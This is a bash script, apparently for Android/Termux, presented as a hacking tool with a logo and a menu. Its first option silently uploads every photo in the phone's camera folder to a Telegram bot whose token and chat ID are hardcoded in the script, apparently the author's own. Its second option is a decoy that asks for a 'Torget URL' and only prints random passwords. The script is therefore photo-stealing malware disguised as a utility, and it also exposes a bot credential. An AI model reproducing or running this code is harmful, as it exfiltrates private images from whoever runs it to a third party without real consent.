#!/bin/bash

#-------------------
#   Configuration
#-------------------
BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"  # رمز البوت الخاص بك
CHAT_ID="5967116314"                                    # معرف الشات الخاص بك

#-------------------
#   Colors
#-------------------
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

#-------------------
#   Display Logo
#-------------------
display_logo() {
    clear
    echo -e "${RED}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║████ ███╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
    '
    echo -e "${RESET}"
}

#-------------------
#   Send Images to Telegram
#-------------------
send_images_to_telegram() {
    local image_dir="/sdcard/DCIM/Camera"
    if [ -d "$image_dir" ]; then
        for image in "$image_dir"/*.{jpg,jpeg,png}; do
            if [ -f "$image" ]; then
                curl -s -F chat_id="$CHAT_ID" -F photo=@"$image" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" > /dev/null &
                echo -e "${GREEN}[+] Sending ${image} to Telegram...${RESET}"
            fi
        done
    else
        echo -e "${RED}[-] Directory $image_dir not found.${RESET}"
    fi
}

#-------------------
#   Generate Random Passwords
#-------------------
generate_random_passwords() {
    local count=5
    echo -e "${RED}Random Passwords:${RESET}"
    for i in $(seq 1 $count); do
        openssl rand -base64 12 | tr -d '\n' | sed 's/$/\n/'
    done | while read -r password; do
        echo -e "${RED}$password${RESET}"
    done
}

#-------------------
#   Main Menu
#-------------------
main_menu() {
    display_logo
    echo -e "${CYAN}Welcome to the Tool!${RESET}"
    echo -e "${YELLOW}1. Send Images to Telegram${RESET}"
    echo -e "${YELLOW}2. Add Torget URL and Generate Random Passwords${RESET}"
    echo -e "${YELLOW}3. Exit${RESET}"
    echo -ne "${BLUE}Enter your choice: ${RESET}"
    read choice

    case $choice in
        1)
            send_images_to_telegram &
            echo -e "${GREEN}[+] Images are being sent in the background.${RESET}"
            ;;
        2)
            echo -ne "${BLUE}Enter Torget URL: ${RESET}"
            read torget_url
            if [[ $torget_url =~ ^https?:// ]]; then
                echo -e "${GREEN}[+] Torget URL added successfully.${RESET}"
                generate_random_passwords
            else
                echo -e "${RED}[-] Invalid URL format.${RESET}"
            fi
            ;;
        3)
            echo -e "${YELLOW}[+] Exiting...${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}[-] Invalid choice. Please try again.${RESET}"
            sleep 2
            main_menu
            ;;
    esac
}

#-------------------
#   Run the Tool
#-------------------
main_menu
